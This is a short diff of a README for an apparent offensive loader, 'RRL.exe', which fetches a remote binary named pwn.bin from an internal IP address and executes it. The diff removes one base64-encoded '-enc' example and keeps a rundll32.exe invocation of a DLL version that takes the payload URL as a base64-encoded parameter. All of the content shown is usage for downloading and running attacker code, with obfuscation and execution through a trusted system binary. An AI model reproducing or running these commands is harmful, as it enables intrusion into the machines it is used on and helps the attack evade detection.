@@ -10,9 +10,5 @@ This project is password protected at this time.
 RRL.exe will take the remote bin file as a parameter like:
 `RRL.exe http://10.0.0.54/pwn.bin`
 
-RRL.exe can also take b64 encoded payloads:
-`RRL.exe -enc aHR0cDovLzEwLjAuMC41NC9wd24uYmluCg==`
-
-
-This can also be run as a DLL like the following: 
+This can also be run as a DLL using a base64 encoded parameter: 
 `rundll32.exe RRLDLL.dll,Driver aHR0cDovLzEwLjAuMC41NC9wd24uYmluCg==`
